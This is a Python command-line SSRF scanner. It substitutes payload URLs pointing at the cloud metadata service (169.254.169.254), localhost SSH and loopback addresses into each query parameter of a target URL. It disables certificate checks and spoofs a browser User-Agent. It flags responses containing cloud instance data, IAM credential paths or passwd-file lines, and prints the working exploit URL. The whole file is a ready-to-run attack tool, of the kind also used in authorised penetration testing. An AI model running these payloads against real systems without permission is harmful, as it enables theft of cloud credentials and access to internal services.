import requests
import argparse
import sys
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cloud metadata and internal service signatures
SSRF_SIGNATURES = [
    "ami-id",
    "instance-id",
    "iam/security-credentials",
    "computeMetadata",
    "root:x:0:0:"
]

def scan_ssrf(target_url):
    print("-" * 60)
    print(f"[*] Scanning parameters for Server-Side Request Forgery (SSRF): {target_url}")
    print("-" * 60)
    
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        print("[-] No query parameters found in URL. Skipping SSRF scan.")
        print("-" * 60)
        return

    # Payloads targeting cloud metadata endpoints and local loopback ports
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/",
        "http://localhost:22/",
        "http://[::1]/"
    ]
    
    vulnerable = False
    
    for param in query_params:
        print(f"[*] Testing parameter for SSRF: '{param}'")
        
        for payload in ssrf_payloads:
            test_params = query_params.copy()
            test_params[param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            ssrf_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
            
            try:
                resp = requests.get(ssrf_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                body = resp.text
                
                for sig in SSRF_SIGNATURES:
                    if sig in body:
                        print(f"  [!] CRITICAL: SSRF VULNERABILITY FOUND in parameter '{param}'!")
                        print(f"      Matched signature: '{sig}'")
                        print(f"      Exploit Payload URL: {ssrf_url}")
                        vulnerable = True
                        break
                if vulnerable:
                    break
            except Exception:
                continue
        if vulnerable:
            break

    if not vulnerable:
        print("[-] No obvious SSRF vulnerabilities detected.")
    print("-" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Server-Side Request Forgery (SSRF) Scanner")
    parser.add_argument("url", help="Target URL with parameters (e.g., http://example.com/load?url=)")
    
    args = parser.parse_args()
    scan_ssrf(args.url)
